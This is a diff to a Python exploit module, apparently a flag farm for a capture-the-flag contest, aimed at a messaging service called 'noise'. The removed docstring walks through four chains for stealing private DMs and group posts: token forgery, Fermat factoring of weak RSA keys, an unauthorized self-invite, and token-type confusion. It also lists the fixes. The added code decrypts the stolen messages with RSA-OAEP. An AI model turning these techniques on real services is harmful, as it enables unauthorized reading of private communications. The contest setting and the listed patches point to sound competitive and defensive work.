@@ -1,60 +1,9 @@
 #!/usr/bin/env python3
-"""noise (6426/tcp) — flag farm module. Four independent chains.
+"""noise (6426/tcp) - farm module. Four independent chains.
 
-
-The secrets live in two SQLite TEXT columns: `dm.message` (private DMs) and
-`gmsg.message` (private group posts). There is no flag file. Every vector here
-returns those plaintexts; the farm applies the flag regex.
-
-Vectors, cheapest/most reliable first:
-
-  1. v_token_forge      — audit chain A + variant A'.
-     `service.py:46 make_token()` is sha256("noise-token-{kind}-{id}")[:16]:
-     no secret, no randomness. `get_token_subject` only checks membership in the
-     in-memory `auth_cache`, and the *unauthenticated* CHALLENGE (op 3) /
-     GROUP_CHALLENGE (op 7) insert the token into that dict before any proof of
-     key possession. LIST_USERS (op 2) and LIST_ALL_GROUPS (op 12) publish every
-     id and pubkey anonymously, so: enumerate -> prime -> forge -> read.
-     Needs no account. Recovers both DMs and group posts.
-     PATCH: `make_token` returns `f"{kind}:{id}:{secrets.token_hex(8)}"`.
-
-  2. v_fermat           — audit chain C.
-     `crypto.py:36 generate_group_keypair` picks q = randprime(...) and
-     p = nextprime(q + randbelow(1<<20) + 2), so |p-q| < 2^20 and Fermat's
-     method converges in 0 iterations on a 2048-bit modulus. Group public keys
-     are exactly what op 12 hands out anonymously. Factor -> rebuild d ->
-     genuinely OAEP-decrypt the GROUP_CHALLENGE -> group token -> op 11.
-     Needs no account, writes nothing to the DB, stealthiest. Group posts only.
-     PATCH: `generate_group_keypair` -> `rsa.generate_private_key(...)`.
-     (Does not retroactively fix groups created before the patch.)
-
-  3. v_invite           — audit chain B.
-     `service.py:127 invite()` never asks whether the caller has anything to do
-     with `gid` (contrast `send_group`, which calls `is_member`). Self-join any
-     group, then LIST_GROUPS (op 9) hands every member the group's `priv` by
-     design -> OAEP-decrypt the group challenge -> op 11. Needs a throwaway
-     account and uses no token forgery, so it survives a `make_token` fix. Noisy:
-     leaves a `group_members` row naming us. Group posts only.
-     PATCH: `if not self.db.is_member(gid, caller.id): raise NotAuthorizedError`.
-
-  4. v_token_confusion  — audit chain D, a widener.
-     `service.py:51 get_token_subject` ignores its `assert_type` argument, so a
-     group token works on user ops and vice versa, with the id reinterpreted in
-     the other namespace. Fermat-derived group token -> GET_MESSAGES (op 5) reads
-     the DMs of the *user* whose uid equals that gid — i.e. DMs with no account
-     and no token forgery, which neither chain B nor C reaches on its own. Also
-     forged user token -> GROUP_MESSAGES (op 11) -> posts of group gid == uid,
-     and group token -> LIST_GROUPS -> that user's groups' private keys.
-     PATCH: `if not isinstance(subject, assert_type): raise InvalidTokenError`.
-
-A closed port or a peer speaking a different protocol is remembered for
-DEAD_TTL seconds so only the first vector of a sweep pays the connect timeout;
-a live-but-patched service (any protocol-level error frame) is not memoised, so
-the other vectors still get their turn.
-
-Pure stdlib: the binary framing is `struct`, the DER codec is hand-rolled, and
-the RSA/Fermat/OAEP maths is `pow` + `math.isqrt` + `hashlib`. Nothing here
-imports cryptography, pycryptodome or gmpy2, so it also runs on the vulnbox.
+Secrets live in the dm.message and gmsg.message TEXT columns. Group posts are
+RSA-OAEP sealed to the group key, which these vectors recover; DM bodies are
+sealed to client-side user keys and come back raw.
 """
 
 from __future__ import annotations
@@ -597,6 +546,24 @@ def _group_token_via_priv(conn: Noise, pubkey: str, priv_b64: str) -> str | None
         return None
 
 
+def _plaintexts(messages, n: int, d: int) -> list[str]:
+    """Decrypt message bodies with a key we already hold.
+
+    `_texts` returns the raw `message` column, and the real client writes
+    urlsafe-base64 RSA-OAEP ciphertext there (`noise_client.py:363,376`): a
+    group post is sealed to the GROUP key, a DM to the recipient's user key.
+    Recovering the token is therefore only half the job -- without this the
+    vector hands back ciphertext that can never match the flag regex, which is
+    exactly what it did against NOP. Falls back to the raw value so a flag the
+    checker planted in cleartext is still returned.
+    """
+    out: list[str] = []
+    for body in _texts(messages):
+        clear = _try(oaep_decrypt_b64, n, d, body)
+        out.append(clear.decode("utf-8", "replace") if clear else body)
+    return out
+
+
 # =========================================================================
 # vectors
 # =========================================================================
@@ -661,7 +628,8 @@ def v_fermat(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str
                 continue
             messages = _try(conn.group_messages, token)
             if messages:
-                found.extend(_texts(messages))
+                # Same (n, d) that just opened the challenge opens every post.
+                found.extend(_plaintexts(messages, n, d))
     return dedup(found)
 
 
@@ -694,12 +662,16 @@ def v_invite(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str
                 continue
             messages = _try(conn.group_messages, group_token)
             if messages:
-                found.extend(_texts(messages))
+                # LIST_GROUPS handed us this group's own private key, so the
+                # posts decrypt without any factoring.
+                key = _try(parse_pkcs8_privkey, gpriv)
+                found.extend(_plaintexts(messages, *key) if key else _texts(messages))
 
         # Anything already addressed to us (normally nothing; free to check).
+        # These are sealed to the throwaway key we just generated.
         own = _try(conn.get_messages, token)
         if own:
-            found.extend(_texts(own))
+            found.extend(_plaintexts(own, n, d))
     return dedup(found)
 
 
